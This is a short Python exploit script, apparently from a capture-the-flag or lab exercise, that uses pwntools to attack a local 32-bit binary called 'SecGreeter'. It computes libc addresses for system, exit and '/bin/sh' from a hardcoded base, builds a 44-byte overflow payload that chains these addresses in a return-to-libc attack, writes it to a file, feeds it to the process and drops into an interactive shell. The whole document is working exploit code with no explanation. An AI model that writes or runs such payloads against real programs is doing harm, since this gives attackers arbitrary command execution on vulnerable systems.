from pwn import *
import struct, sys

# Set up the ELF object for libc
libc = ELF("/usr/lib32/libc.so.6") 

libc_base = 0xf7d76000  
 
system_offset = libc.symbols['system']
exit_offset = libc.symbols['exit']
bin_sh_offset = next(libc.search(b"/bin/sh"))

system_addr = libc_base + system_offset
exit_addr = libc_base + exit_offset
bin_sh_addr = libc_base + bin_sh_offset

# Display the calculated addresses
print(f"libc base address: {hex(libc_base)}")
print(f"system address: {hex(system_addr)}")
print(f"exit address: {hex(exit_addr)}")
print(f"/bin/sh address: {hex(bin_sh_addr)}")

# Construct the payload
buffer_offset = 44
payload = b"A" * buffer_offset + struct.pack("I", system_addr) + struct.pack("I", exit_addr) + struct.pack("I", bin_sh_addr)         

# Save the payload to a file
with open("exploitV2", "wb") as f:
    f.write(payload)

p = process("./SecGreeter")
p.sendline(payload)
p.interactive()